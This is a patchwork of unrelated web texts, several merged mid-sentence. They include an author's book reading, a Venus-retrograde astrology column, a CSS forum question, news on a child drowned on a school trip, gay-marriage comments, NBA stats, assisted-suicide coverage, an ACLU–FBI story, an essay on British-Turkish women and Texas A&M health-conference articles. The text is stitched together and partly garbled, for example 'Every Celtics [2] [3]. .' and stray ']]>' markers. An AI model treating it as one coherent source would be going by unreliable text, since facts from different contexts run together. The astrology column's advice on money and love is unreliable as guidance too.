“I confessed that I read the entire ‘Unearthly’ series in the span of three days, staying up all night to see what would happen on the next page,” said Dubrow. “We watch Clara fall in love for the first time, we watch her struggle with college applications. She may be part angel, but what makes Clara so compelling is that her narrative remains so human and familiar.”
Hand read excerpts from “Unearthly” at the Lit House as well as a chapter from the book she is currently writing. It tells the story of a math student who thinks mostly in terms of numbers and statistics but is starting to see the ghost of her brother. The next series she wants to work on is more dystopian, but Hand admits it will be hard to sell considering the publishing market is only accepting contemporary at this point.
At the end of the day, though, “You got to write what you love and what interests you,” she said, “and have faith in it.”astrology, ECLIPSE magazine, New Year Astrology 2014, The Astro Essence, Venus Retrograde, Winter Solstice

Interesting that what we label ‘the holidays’ in much of the Western world typically falls in Capricorn. That would seem odd, with Cap’s stodgy reputation (though the affinity for gratitude in this sign is a nice fit) except when we note how Earth, the very planet upon which we sit, is currently (from a heliocentric point of view) nestled in caring, loving, nurturing, mommy-ish Cancer, with the holidays in question centered on the generosity and love that is at the heart of Cancer’s urge to nurture, feed, and ‘fix’. To be open to those Earthly energies, to celebrate them and express our appreciation for others with gifts and song and food (so Cancer!) and then to renew ourselves (like a phoenix, or a license, or a Time Lord) as the New Year begins—and this year we really do have a chance to rise from the ashes, as the Sun of 1 January 2014 conjuncts Pluto, and Mars squares the Sun-Earth axis, providing unlimited energy, the kinetic kind, with a chance to reform and resurrect identity and purpose.
The 21st is the Solstice and the beginning of the Venus Retrograde, the former marking the shortest day and longest night at the equator, with the recipe reversed for the Southern hemisphere, and the latter bringing us temporary changes in values, attitudes toward Love and Money, and often lessening of opportunity in the Houses ruled by Venus—though House matters may play out instead as relationship, aesthetic, or spending choices we later find cringeworthy. Think about how the retro period, running through 31 January, gives us plenty of time for a whirlwind courtship and marriage, enough time to cash out our life savings to invest in that plan for a space elevator or chinchilla breeding scheme (at a time when use of fur may be at an all-history low) or to finance your brother-in-law’s invention that’s been sitting under a tarp in his garage for years, and certainly we do have time to get the Last Supper tattooed on our backs, and the retro runs just long enough that most of us, if doing our worst, could end up jobless, homeless, and/ or divorced if given enough Venus contrarian rope. Be careful, as we can’t count on the reliability of our own tastes, values, or feelings to guide us terribly well during the Venus retro—that, of course, is where the danger lies. The best guideline: don’t do anything that can’t be easily undone, should you change your mind after direction.

Set A Different Css Stylesheet On An Individual Builder Child Theme Page?

Do you know if there is a way to set a different stylesheet on a specific page on a Builder site? I have one page that I want to have a different navigation menu color than the other pages, and the place to set that is generally in the stylesheet. I would do it inline if I knew where to insert it, otherwise wondering if there is a specific place I can inject some code to pick a stylesheet if the page in question has loaded.
Thanks alot in advance

Max Palmer was swept away in a small flooded river near Glenridding in Cumbria.
He was with older children on a trip from the Lancashire school where his mother, Patricia, works.
She tried to save him, but was also swept 100 metres downstream.
Elaine Blair, Max Palmer's aunt, said; "This is devastating news for our family, friends, and anyone who knew Max Palmer - a truly exceptional little boy.
"Max was a happy, bright, student with many friends, a keen footballer.
"His smile touched everyone's hearts and he was such a special light in all our lives."
Margaret Dudley, headteacher at Fleetwood High School, where Mrs Palmer worked, said Max was a pupil at a local primary school and described him as
a "bright young boy".
An investigation involving both the police and the Health and Safety Executive has been launched into the tragedy, in which another child was airlifted to hospital.
Police have begun interviewing pupils and teachers from Fleetwood High School.
Detective Chief Inspector Bill Whitehead of Cumbria Police said: "We are also appealing for any other groups, walkers or ramblers who may have been in the area at the time."
Detective Chief Inspector Andy Carter added: "Our inquiries will also include who was on the trip and what their roles and responsibilities were."
Mrs Dudley said:"Max went along on the school trip with his mother. When an accident like this happens it just shocks the whole school."
A spokesman for Lancashire County Council said specialist staff will be offering counselling to teachers and children at both schools.
Patterdale mountain rescue team, out on a training exercise in the area, rushed to the river, where they managed to resuscitate Mrs Palmer.
But the team doctor pronounced the boy dead at the scene.
Mrs Palmer was airlifted to Furness General Hospital suffering from mild hypothermia.
He and his colleagues used a rope system to bring Mrs Palmer and a second child down from the beck, which was about 400 metres from a nearby youth
hostel.
The second child suffered cold and a grazed ankle.
Steve Howe, director of the Outward Bound Trust, which has a centre in nearby Ulswater, said schools should be governed by the same safety regulations as other adventure activity organisers.
He said: "We are governed by licence. If we were involved in the same mountain river walk activity we would have to ensure we had carried out a full assessment of the hazards involved.
"It would appear to be an anomaly in that you could have had two groups on the same day doing the same activity, one with a licence and one without."
Another tragedy
Inspector Paul Kissack, of Cumbria Police, said: "Part of this course involved what's described as a controlled river activity and during this activity a young 10-year-old boy tragically became overpowered by the force of the river and was swept downstream."
It is the second time in 20 months that a child has drowned in a river during a school trip.
Earlier this year, a coroner asked the government to take action to prevent another tragedy like the one in which two schoolgirls were swept to their deaths
in a river.
Hannah Black, 13, and Rochelle Cauvet, 14, died after they lost their footing and were washed down Stainforth Beck, near Settle, North Yorkshire, on October
10, 2000.
The "river walk" activity was part of a residential week planned by Royds School, in Oulton, near Leeds.Public space design is a hugely important part of making our cities and communities livable and (as a result) ultimately more sustainable. Once the realm of professional designers, public spaces have been transformed over the past decades by artists, community groups and unlikely candidates through a new trend of citizen-spurred placemaking titled tactical urbanism.
Tactical Urbanism (TU) is loosely defined as inexpensive, individual projects that make small places more lively and enjoyable, and was coined in part by 2013 Place by Design juror Mike Lydon of The Street Plans Collaborative. Place by Design (PXD), our public space design competition, was proud to highlight both professional and tactical urbanist submissions in 2013, and we look forward to more types of exciting and novel projects for this year. The competition is open to any project that has a positive transformative impact on public space, and includes temporary and permanent projects as well as digital applications. View last year's PXD finalists here, and read more about the application and submit your work here. Don't delay! The deadline for applications is June 20.

Of course, he went on to say that the paper is not antigay, but simply "for marriage remaining the important man-woman institution it has always been." Seems like the paper shares the opinion of President Obama, who cut an "It Gets Better" ad to speak out against gay bullying, but still opposes gay marriage. Do you think such a position is possible? Can you support gay Americans while opposing gay marriage?

I hate this belief and I really wish these people would stop creating such a nasty picture of the God I know and love. It is not Our job to condem, it is our job to spread the love, the word and the work of God. Anything beyond that is His right, His job. I have known many gay/Lesbians in my life and they have always been kind and respectful towards me and I towards them. I hate the nastiness they face and the bullying that has been claiming so many young lives. So make what you will with that Informtion. But know that if you are gay/lesbian...No, I refuse to believe God hates you, I firmly stand by my belief of marriage, but I DO NOT BELIEVE GOD HATES YOU!!
Haha... *gays*... wtf? Attention! Asterik gays don't support the fight for equality!
@Mediabiz - "BTW, many *gays* do NOT support gay marriage." Troll alert. I'm sorry, but how many "gays" do you know that don't want equal civil rights? Your comment strikes me as ignorant (plus you didn't finish it), but if you were going to argue semantics, I think we're all aware that we're talking about the civil institution of marriage here - not the religious one.
Yes. BTW, many *gays* do NOT support gay marriage. Kudos to the
Joseph wasn't thinking to brightly though, it was pretty obvious this would make the news and cause gay rights groups to fight against him. I'm sure no one or very, very few people would have unsubscribed because of a gay marriage announcement. Many people probably wouldn't have even given it thought. Now if I lived there, I would have unsubscribed because of this.
Not many people have the courage to say how they really feel. The president wants to please both sides to keep his approval rating up. Newspapers don't want to lose subscribers as already mentioned. It's a game and people are being played.
This is absurd. I agree with the majority here.
I agree with Pistil 100%.
You can support gays but oppose gay marriage in a destined to fail, separate but equal, way. Does this mean the paper supports and approves everything else it publishes?
Perhaps they don't want to offend their readers and lose subscriptions.
No. No further explanation needed.
Pistil, that's what I thought, too...Why is a newspaper even having an opinion? Shouldn't they deliver facts? Fact is, someone got married. Whether they like it or not, that couple is gay. I don't think that position is possible though, like postmodern said, how can you support gays and then say you don't want them to have the same rights as everybody else? Doesn't make much sense.
Newspapers censoring the news in order to validate the owners' opinions? Sounds just fine to me!
No, I don't think you can be fully supportive of gay Americans when you're opposed to gay marriage. Anti-marriage views for gays is rooted in nothing but bigotry, no matter which way you try to justify it. That's like saying you're all for supporting African Americans, but you still back segregation laws. Doesn't work that way.
I think the position is possible, but should newspapers have opinions? Shouldn't any credible news source be as unbiased as possible? Do they refuse to print news articles on topics they disagree with? I've never heard of anything like that over here.
I don't see anything wrong with this. It's just one newspaper's opinion, who's to say it's more right or wrong than anyone else's?

10,144
Career assists for Steve Nash, who passed Magic Johnson for No. 4 all-time in NBA history (10,141) feeding Antawn Jamison for a baseline bucket. “It’s crazy,” Nash said of the accomplishment. “I definitely didn’t see that coming when I was 15 years old. What can I say? He’s an idol of mine. I grew up watching him and idolizing him and trying to emulate him. To do it here in L.A. with this franchise is definitely special.”
49
Rebounds for the Lakers, with Earl Clark (16, a career-high) and Dwight Howard (12) combining for 28. L.A. owned a plus-15 in this category after getting outrebounded 36-30 in the last meeting on Feb. 7 at Boston. The home team also grabbed 14 offensive rebounds, leading to 17 second-chance points, compared to the Celtics seven.
22
Plus-rating for Howard, who finished with a team-high 24 points, to go along with 12 boards, one steal and one block. In the first quarter alone, the big man recorded 12 points and six rebounds in helping the Lakers jump out to a 36-27 lead. “I think he’s had some good games, but he was definitely great tonight,” Nash said of Howard’s play. “He really tried to work and do the little things for his teammates. He can make a such big impact on the game regardless of the stat sheet if he plays with a belief, hunger and energy.”
7
Laker players in double figures, including all five starters. The offensive balance was evident as all seven players who finished with double-digit points had at least seven field-goal attempts. In the second half, L.A. recorded 14 assists on 19 made field-goals. “We moved bodies (on offense) and moved the ball and made it tough on their defense,” Nash said. “I think it gives us a little more of an identity. We don’t have guys standing around as much at the end of the game, so I think it fueled us on both ends of the floor to have that movement.”
3
Points for Paul Pierce – all on free throws – as he failed to convert on his two shot attempts in 12 minutes after halftime. This was after the Kansas product recorded 23 in the opening 24 minutes of play (9 of 15 from the floor, including 4 of 7 from deep). Pierce played just a single minute in the fourth as the Lakers lead swelled to as many as 22 points with Boston on the second game of a back-to-back (played at Denver the previous night).There were concerns raised during the development of the legislation here over tourism and the impacts on the Asian market. In reality, post legislation, there has been no impact.
A simple testing question was put to the media, politicians and the public at the time -- do smoking tourists come here to smoke or to enjoy our beautiful country?
Having spent the best part of 11 hours flying time from Japan to New Zealand, a smoker has clearly decided that is for the country, not the cigarettes! Why would going to Hawaii be any different?
I hope the policy makers in Hawaii have the integrity to recognize that the current maltreatment of those who enjoy the smell of smoke not only harms the economy but is simply not humane. Humane regulation of tobacco use means both those who do and do not enjoy the smell of smoke must be respected. Aloha will not be restored as a credible description of our island culture until all people are treated with the same respect. The former smoking law provided mutual respect for all concerned: business owners, customers and employees.
So who needs a special session of the Legislature? What we need is a proper environmental assessment, and in fact an environmental impact statement.
A much smaller craft that would, like in Tahiti, go up and down the island chain with people and their suitcases and coolers, stopping for an hour at each island. That would be great!
The impression that I get from reading the articles about all the protesters and the lawsuits that have been filed is that those "elite" residents of Kauai don't seem to want their precious paradise to be invaded by the "great unwashed masses" from Oahu and the "mainlanders" who have suffered greatly by being forced to sit for many hours in an overcrowded airplane just to be able to spend their money in Hawaii.
It was a very fortunate circumstance for Noah when his ark came to rest on Mount Ararat in Turkey, rather than the pristine shores of Kauai.
To all you snobs of Kauai: "Come visit Orlando ... Walt Disney World will gladly welcome your money."
If I had to guess, I'm certain Lindberg would admit that he would rather have the Thunderbirds doing aerobatic shows, too.
And even if something is intended to do harm, there's no reason why it can't be directed into a more productive channel. Computers and computer science, after all, were developed by the military to facilitate their operations (the goal of said operations to sometimes "kill and destroy"). Yet nobody clamors that computers shouldn't be used because they were intended for the purpose of facilitating death.
So the next time the jets fly out to perform, I hope that Lindberg simply relaxes and enjoys the show.

GPC offers mounted instruction in the spring and fall at the Groton Fairgrounds, unmounted instruction during the winter, and a week-long overnight camp in the summer.LONDON, September 21, 2009 (LifeSiteNews.com) – Under new guidelines to be issued Wednesday, individuals who help others kill themselves will escape prosecution and punishment in Britain as long as prosecutors can discern no motive of personal gain in assisting in the suicide.
This past weekend Keir Starmer, Britain and Wales’ Director of Public Prosecutions, gave several news outlets a preview of changes made to the assisted suicide law’s guidelines. The new guidelines are due for publication Wednesday.
Starmer told BBC’s Andrew Marr that “while we’re certainly not changing the law,” the new guidelines intend to “clarify when individuals are more likely to be prosecuted or more likely not to be prosecuted.”
“The general approach we’ve taken is to try to steer a careful course between protecting the vulnerable from those that might gain from hastening their death, but also identifying those cases where nobody really thinks it’s in the public interest to prosecute,” said Starmer.
The DPP confirmed that the prosecution guidelines will apply to suicides committed in Britain and Wales, as well as those outside the country, suggesting that it would be unfair to discriminate those who “can’t afford” to travel to Switzerland to kill themselves.
“The one thing I hope I have made clear is that this policy will cover assisted suicide wherever it takes place,” Starmer told the Guardian, “including in England and Wales [Scotland and Northern Ireland have their own prosecution services]. It shouldn’t be something that covers those who go to Switzerland and not those who can’t afford to do so.”
While the new guidelines appear to be set to effectively allow assisted suicide in the country – in practice, if not in official law – Keir says, “As for legalising assisted suicide altogether, that really is a matter for parliament.”
“Is that somewhere that the politicians think the public now is, such that they’ll move ahead?”
More than one hundred Britons, some of whom were not terminally ill or had no illness at all, have traveled overseas to kill themselves at the Swiss suicide facility Dignitas since 1992. As the suicides mounted, the DPP’s office repeatedly asserted that accompanying relatives would not be prosecuted. According to British law, assisting suicide is technically an offense that carries a maximum sentence of 14 years in prison.
The House of Lords recently ordered a further “clarification” of prosecution guidelines as part of their ruling in a case brought by Debbie Purdy, a British woman with multiple sclerosis. In July, Purdy won her argument that the government should clarify whether her husband would be prosecuted, in the event he helped her kill herself in Switzerland.
The Telegraph’s George Pitcher slammed the planned guideline revisions as, “in reality, a change in the law” effected not “by Parliament, but by a ginger group of Lords and lawyers.”
“The DPP, Keir Starmer QC, has dutifully played his role in this legislative charade. He made some respectable noises after the Law Lords’ ruling that it wasn’t for him to change the law,” wrote Pitcher. “Then he proceeded in effect to do just that.”
Pitcher lamented that “a deathly cabal is succeeding in usurping an age-old provenance of life over death without proper parliamentary debate.”
“We will end up with a Dignitas-style clinic, with its grotesque aspirations to self-destruction as a consumer choice, in Britain,” he wrote.
In the meantime, members of the Swiss government have begun moving toward tightening assisted suicide laws in an attempt to curb the increasing popularity of “suicide tourism.”
Swiss Justice Minister Eveline Widmer Schlumpf reportedly supports a bid to tighten the country’s assisted suicide law that will be presented to the Swiss parliament. Two Swiss cabinet members are seeking to have the law abolished altogether, although their position is not expected to garner much support.
Swiss doctors have also criticized Dignitas for helping non-terminal and mentally ill individuals kill themselves. The facility aroused fierce controversy in April, when founder Ludwig Manelli sought permission from the Swiss government to accommodate Vancouver resident Betty Columbias. Columbias expressed a wish to be killed alongside her severely ill husband despite being in excellent health herself.
Alex Schadenberg, the head of Canada’s Euthanasia Prevention Coalition, told LifeSiteNews.com (LSN) today that revising the British guidelines were a natural part of the “right to die” lobby’s strategy to strike down anti-assisted suicide laws.
“It’s opened the door to the full striking down of the law, because what you’ve done is you’ve made certain circumstances where we’re going to turn a blind eye to the concept,” said Schadenberg. “Under the whole concept of being equal and fair, it’s put into [the law] an inequality.”
Schadenberg, who said he could not comment directly on the guidelines since they have not yet been officially released, also criticized the “clarifications” for stretching the purpose of the law. “The law really can’t determine motive. Now we’re changing our determinations of the law,” he said.
John Smeaton of the Society for the Protection of Unborn Children (SPUC) suspected that Starmer’s pre-emptive discussion of the new guidelines was a public relations move designed to “soften up public opinion in advance of the new policy.”
“Statute law has not been changed but the DPP’s policy could well make a difference in the way people behave in circumstances of a person’s suicide,” wrote Smeaton on the SPUC blog. The court decision spurring the revision, Smeaton noted, “included a legal argument to say that committing suicide was part of one’s right to private life which is protected in article eight of the European Convention on Human Rights.”Chrystal Redekopp has transformed herself into a giraffe, a gorilla, a hippo, a pikachu, a baboon and a capybara — all for a good cause.
Using face paints collected for Halloween costumes over the years, the UC Berkeley senior will put on the face of any animal requested by donors to her Walk to End MS fund. And then she’ll post a photo of her face on her Facebook page.
It’s Redekopp’s way of rewarding people who support her participation in the annual charity benefit, which aims to raise $1.4 million this year to fight multiple sclerosis. This year’s East Bay walk takes place Saturday at Oakland’s Lake Merritt.
The walk is an every-year event for Redekopp, a Billings, Mont., native who lost her mother to the debilitating disease two weeks before she started college in Nevada. She lasted a semester. Eight years later, she came to Berkeley as a re-entry student and is about to graduate with a major in sociology and a minor in education.
“The main reason I do the walk is for her memory and to help people who are in the same situation I was,” says Redekopp, “because no one should have to go through that.”
Redekopp’s face painting skills go way back. She always loved costumes as a kid, and Halloween was her favorite holiday. When she was 10 or 11, she’d take a card table with her when the family went to high school football games and set herself up as a face painter, charging 25 cents per cheek or $1 for a full face job.
Her Facebook photos show some of Redekopp’s more recent, and very elaborate, Halloween transformations — Ziggy Stardust, Wonder Woman and a Roy Lichtenstein portrait, complete with word bubble.
But this is the first year she’s meshed her face painting with the MS fundraiser.
“I was thinking about how boring and annoying it must be for people to get emails and Facebook posts saying, ‘Donate to my cause,’ “ she recounts. “I thought it would be fun for people if there was an incentive, and if I had to just do a little work.”
Her first idea was to do impressions of animals, but then people started asking for unusual ones. So she decided to paint her face instead and photograph the results.
“I thought it would be fun,” she says.
Her first request was for a giraffe. As soon as the photo went up on Facebook last Friday (April 13), she says, donations started pouring in. Since then she’s raised her original fundraising goal of $500 to $1,600.
“It’s pretty labor intensive,” she admits. The capybara took her six hours; the gorilla three.
Photos of her first six animals are displayed with this article and on Redekopp’s Walk for MS Facebook event page, titled Animal Crackers, and on her own page, where she’ll be posting upcoming Chrystal-as-animal photos. Already waiting are requests for a zebra, honey badger, bear, cheetah, zorse, chicken or pug and koala.
She’s recruited a team of eight friends to walk with her, including others from Berkeley, and they’ve raised more than $4,000 so far.
Donations to Redekopp’s Walk for MS can be made through her page on the National MS Society website, where she tells her story. More information about the East Bay walk can be found on this webpage, also on the national site.Flashlight widget - FREE

Unveiling a new project called “Mapping the FBI,’’ the ACLU used internal bureau documents to portray the FBI as linking criminal behavior to racial and ethnic groups and using U.S. census data to “map” those communities so they can be investigated.
The civil liberties group posted the documents on the Internet and vowed to further expose what it called unconstitutional FBI tactics.
In one document that was highlighted, a 2009 memo in the FBI’s Detroit field office sought permission to collect information on Middle East terrorist groups in Michigan, noting that: “Because Michigan has a large Middle Eastern and Muslim population, it is prime territory for attempted radicalization and recruitment by these terrorist groups.’’
But the same memo pointed out that the terrorist groups “use an extreme and violent interpretation of the Muslim faith,’’ appearing to make a distinction between extremists and other Muslims. And each document was heavily redacted, leaving unclear what agents did with any information they collected.
Taken together, the memos “confirm some of our worst fears” about FBI surveillance, Hina Shamsi, director of the ACLU’s National Security Project, said in a conference call with reporters. “The FBI has targeted American communities for investigation based not on suspicion of wrongdoing but on the crudest stereotypes.’’
FBI spokesman Michael P. Kortan rejected that interpretation of the documents, which the bureau turned over to the ACLU in legal proceedings. He said that the FBI opposes discrimination against minorities but that “certain terrorist and criminal groups target particular ethnic and geographic communities for victimization and/or recruitment purposes. This reality must be taken into account when determining if there are threats to the United States.”
Kortan added that mapping is widely used by law enforcement and is essential to protecting the nation from terrorist attacks.
“Just as putting push pins on a map will allow a local police chief to see clearly where the highest crime areas are, combining data that is lawfully collected into one place allows connections to be identified that might otherwise go unnoticed,” he said.
FBI officials characterized the use of census data as one factor that helps field offices identify potential threats in their regions, their top priority as the bureau continues its post-Sept. 11, 2001, transformation into an organization able to detect and dismantle terrorism plots.
The debate reflects the FBI’s ongoing challenges in balancing its fight against terrorism with respect for civil liberties.
The bureau’s tactics have long been controversial, and civil liberties groups have accused agents of overreacting to the Sept. 11 hijackings.
FBI officials say they have helped safeguard the nation from another attack.
The documents released Thursday emerged from requests filed last year with the FBI by 34 ACLU affiliates nationwide under the Freedom of Information Act. The ACLU, which is seeking to uncover evidence of racial profiling, has sued the bureau in three states, seeking to compel production of more materials.
Other documents show FBI offices collecting census data and linking it to perceived threats from groups, such as the National Black Panther Party, Chinese and Russian organized crime, and the Mara Salvatrucha, or MS-13, street gang.
Documents from offices in Alabama, New Jersey and Georgia, for example, cite concerns that MS-13 members are committing more crimes.
Noting that members are typically from El Salvador, Guatemala or Honduras, the memos break down population data for local people born in those and other Latin American countries.
They also cite other material that agents say justifies investigative activity, but much of it is redacted.

If ever a player knew how to play it cool, it is Rajon Rondo [1].
Every Celtics [2] [3]. .’
Rondo said he wasn’t sure of how bad the injury was at first.
“I didn’t know,” Rondo added. “I was just worried about my fall, really. That was my biggest concerned. I knew what a dislocated elbow felt like and it wasn’t that so I was thankful for that. My wrist was throbbing. It’s just day-to-day. See how I feel [Thursday]. Took a couple of Advil and I’m sure I’ll be OK.”
Rondo finished with a game-high 21 points as the Celtics snapped a five-game losing streak with a 96-73 win over the Raptors at TD Garden. He finished with just one assist, leaving the passing work up to Paul Pierce [4], who finished with a game-high seven assists in 23 minutes.
‘Paul kind of joked and told me ‘let’s roll tonight’ and he would make the plays and I’ll just put it in the basket,” Rondo said. “I got some wide open looks at the rim, made some easy ones, made some tough ones. I was just trying to stay aggressive. I wanted to pick and choose my spots and I think I did a good job with the pace.’
As for ending the five-game skid, Rondo said the win was desperately needed for morale.
‘We needed a night like this,” Rondo said. “We talked about it before we started and we came out in the 3rd quarter and did what we had to do. This is the second-longest winning streak we’ve had this year.”

The Social Politics of Young Turkish Women
Being that I am ethnically Turkish, to grasp precisely what the “Western” view of its social attitude toward women is, poses a number of difficulties. In casual conversation, people are far more comfortable idealising Turkey as an idyllic getaway, an awkwardly beautiful paradox of Eastern tradition (age old cuisine, arabesque music) and Western normalities (alcohol, cigarettes, art). The symbol of a scantily clad sequinned-hip-scarf-adorned beauty is just as relevant to Turkey’s cultural image as that of a burka, niqab or hijab-clad Islamic woman. Indeed, it is between these two extreme ideals that sociological problems fester, and from my own understanding and experience, Turkish women are often seen as little more than these aforementioned symbols.
Being simultaneously British and Turkish and perhaps most unfortunate of all, a woman, means then that ones life is subsquently outlined by racial and gender stereotype. My family rarely integrated with other Turks – not intentionally, but the family in and of itself is large and extensive enough that family friends were not seen as particularly necessary, there was no shortage of company or conversation. As the youngest and a girl, my formative years passed without question. I had amazingly influential female figures to look up to in my mother and my aunts – who generally gave the finger to what it meant to be a “Turkish woman” and who thus instilled in me the foundations of my feminist tendencies – and a brother and (solely male) cousins, whose boisterous nature inspired me to ensure that my voice, too, was always heard. And this is the way my life continued, until puberty hit and the truthfully shitty nature of things came to light.
As i’ve come into contact with an increasing number of my female Turkish contemporaries, I am never shocked to discover that the majority of their friendship circles are made up of…other Turkish girls and boys. While I find this social pattern upsetting, it is not difficult to see why. For me, puberty was a hormonal and venemous wake up call to the realisation that, while my familial unit was wildly whimsical, it was and very much still is, a patriarchal structure. Bringing boys home is a no, going out with boys is a no, staying out late is a no, being out alone is a no, being out late with friends is a no. And while at the ages of 13, 14, and at a push, 16, these rules are perfectly plausible, at 18 they are just fucking ridiculous. Ultimately then, one option alone is granted – bring home a boy (if he is Turkish), go out with a boy (if he is Turkish), stay out late (with other Turkish people), be out alone (in a Turkish neighbourhood), be out late with friends (provided they are Turkish). Growing up, it was truly shocking to me that this dangerously backward fallacy was (and, indeed, still is) echoed throughout British-Turkish families.
This patrairchal logic has, over time and through generation, permeated into the physce of an overwhelmingly large number of Turkish women. A sexually assertive and (shock horror!) active young woman is gossip fodder for bored housewives and judgemental peers. And needless to say, this same level of scrutiny is not inflicted upon male members of the community. Indeed, sexuality is something to be ashamed of, because of course, the only virtue a woman has is neither mental nor emotional. It is made up only of what is, or has been, between her legs. Relationships (particularly interracial) are kept a secret, so as not to stain the purity of what a Turkish “hanim” (lady) should be. Browsing through a friends Facebook, i couldn’t help but laugh out loud when i came across a group for “non-rezil” Turkish girls. “Rezil”, by definition, implies someone disgraceful or shocking. My laughter was as much the result of humour as it was confusion. Are we, seriously, as women in the 21st century, entertaining (let alone celebrating) the idea of measuring a woman by her reputation? Excuse me while I throw up……

The influenza pandemic of 2009 and more recent threats involving Middle East Respiratory Syndrome (MERS) and Ebola revealed national preparedness gaps, a topic explored extensively at the George H.W. Bush Sixth China-U.S. Relations Conference in Houston.
Remedies are essential to avoid future high-consequence emergencies that could threaten large segments of our populations, economies and infrastructure.
While concerns regarding Ebola are most recent, lessons can be learned from other recent outbreaks of the past 15 years including SARS.
“Severe acute respiratory syndrome (SARS) was an important wake up call for the Chinese government and its entire health care system, including the ability to respond to such emergencies,” said Zijian Feng, M.D., MPH, deputy general director of the China Center for Disease Control and Prevention. “China’s public health systems improved tremendously. We established Centers for Disease Control (CDC) in cities and counties; they are quite modernized with up-to-date equipment and human resource development as well. We refined our disease outbreak monitoring system and established an emergency response team we can deploy in a very efficient manner.”
“We are trying to address a wide range of threats, and more rapidly develop threat-specific countermeasures,” said panel speaker Michael G. Kurilla, M.D., Ph.D., director of the Office of BioDefense, Research Resources, and Translational Research at the National Institute of Allergy and Infectious Diseases. “We have to be ready for things we are fully aware of, but also something new and unexpected.”
In addition to Feng and Kurilla, other panelists included:
The panel offered the chance for some of the world’s most influential physicians, scientists, policymakers, government officials and business leaders to explore issues such as the successes and failures of the response to Ebola and how a collective approach by countries such as the U.S. and China can assist in global efforts to respond to the “inevitable next time.”
“You can’t expect a health system to suddenly appear overnight,” Vankayya said. “Nations cobbling together a response in real time is really unacceptable.” He recognized the impact of health care workers who respond to crises for selfless reasons. “In the Ebola response we saw people from China, the U.S. and other places choosing to go for humanitarian reasons. We also have the moral compass here and we should broadcast that more.”
Panelists offered insights related to advanced planning, streamlined processes and establishing vast collaborations to better prepare for future needs in the detection, treatment and prevention of infectious disease.
The China-U.S. Relations Conference united delegations from the two countries in the monumental planning and promotion of this event, which convened for the sixth time. Conference hosts included the Chinese People’s Association for Friendship with Foreign Countries, Texas A&M Health Science Center, Peking University Health Science Center, Texas A&M University and the Texas Medical Center in Houston.]]>

Cirillo and his TAMHSC team along with the spinoff company GBDbio Corp. have created a portable, low-cost diagnostic device known as TB REaD, currently undergoing clinical trials.
No location on the planet escapes the devastating toll of tuberculosis (TB), the second deadliest infectious disease worldwide..
For Texas A&M Health Science Center’s Dr. Jeffrey Cirillo and international allies who discussed the topic at the conference, the priority is frustratingly long range but clear: eradication.
Despite promising technological innovations, a cookie-cutter approach will not solve this global problem, both U.S. and China officials say. Differences in governmental regulations, health care delivery, diagnostic methods and treatment effectiveness require customized intervention by location. Adding urgency to the issue is China’s epidemic-level incidence, with nearly a million new TB cases diagnosed every year.
“In the past 10 years China has funneled a huge amount of money into TB epidemiology and diagnostic technologies, and it is intriguing to see what they’ve got and how they’re planning to apply it,” said Cirillo, director of the Center for Airborne Pathogen Research and Tuberculosis Imaging at TAMHSC, who is chairing the TB roundtable discussions at the conference. In recent years his lab has hosted several Chinese government employees for training in specific diagnostic procedures for implementation in their home country.
“A group met in Beijing in 2009 on a similar topic, but the focus this time is on technological advancements and how we can incorporate new TB detection methods,” said Cirillo, whose groundbreaking new rapid TB diagnostic device was among the strategies discussed during the Houston conference. Sessions featured detailed collaboration among representatives of higher education, government, industry and the public health sector.
“We often say we have a dream: It’s to have precision medicine for TB clinical care,” said Dr. Xiaoqing Liu, a physician in the infectious disease department at Peking Union Medical College Hospital in Beijing. She described a network of 16 “cooperation centers” located at some of the 200 special hospitals designated to treat active pulmonary TB cases. The centers have been established to build a foundation for better Chinese TB clinical trials, and she suggested a use for them in studying Cirillo’s detection device. “Maybe we can collaborate,” she said.
Over the past 10 years, China has achieved a 26 percent reduction in new TB cases, according to World Health Organization data. However, TB prevalence globally is still staggering, particularly among many Asian and African countries.
Cirillo and his TAMHSC team along with the spinoff company GBDbio Corp. have created a portable, low-cost diagnostic device known as TB REaD, currently undergoing clinical trials in Thailand, Peru, South Africa and Vietnam through the World Health Organization, foundations, multiple other nonprofits and groups. Close to becoming available for use by providers worldwide, this device shortens diagnosis time from several days to 10 minutes.
“It will make a huge difference to be able to diagnose earlier,” Cirillo said, explaining that patients can transmit the disease by coughing or sneezing before it is even possible to confirm their own TB diagnosis through current testing methods. “Until now, we really haven’t had anything to diagnose TB rapidly, particularly in low resource settings, and particularly in pediatric cases.” In related efforts to rapidly diagnose the disease, his team is focused on advancing a test that can detect a nonpulmonary form of TB in children.
Drug-resistant TB, now present everywhere in the world, is hampering efforts to fight the disease. In 2013 an estimated 480,000 new cases of multidrug-resistant TB occurred worldwide, according to the World Health Organization. Resistance to the drugs known to fight the TB bacterium makes these cases particularly deadly.
For this reason, Cirillo is pursuing an additional diagnostic approach known as drug susceptibility testing to detect antibiotic resistance. This molecular test measures the viability of the bacteria causing TB, offering secondary confirmation to the initial findings showing TB’s presence. Whereas this secondary test currently is done by culture and results take weeks to obtain, Cirillo and his team are aiming to offer results within two hours. This time saved is vital in implementing additional therapies, closely monitoring patient compliance and minimizing disease transfer.
A successful fight against TB should pair advanced diagnostic tools with cutting-edge therapies to treat the condition effectively. Ross Underwood of Johnson & Johnson’s pharmaceutical research division described for session attendees the company’s newly developed antibiotic called bedaquiline, the first new such TB drug in 50 years. “This is largely a disease of the poor, and those who can’t help themselves,” Underwood said, explaining the treatment’s use for multidrug-resistant TB in adults. “We have a commitment to provide worldwide solutions and also not leave patients behind.”
“Working together with the Beijing CDC, the Henan CDC, GBDbio, Johnson and Johnson and investigators at Texas A&M, we hope to develop the necessary interactions to allow incorporation of emerging diagnostics and treatment strategies,” said Cirillo. “This will allow us to better combat tuberculosis in China and throughout the world.”]]>

The products that result from biotechnology commercialization can be as varied as the patients they ultimately benefit. Whether it’s an inhaled therapeutic that stimulates innate immunity of the lungs to prevent the spread of bacterial and viral infections, or a novel tuberculosis test that allows doctors to diagnose the infectious disease within minutes, the partnerships between academic institutions, their spinoff companies, industry, and government are the driving force behind advancing these products to the market — and on faster timelines than ever before. The above-mentioned technologies borne from Texas A&M Health Science Center discoveries are just a few examples of how new, more innovative approaches for the translation of biotechnologies are being adopted worldwide.
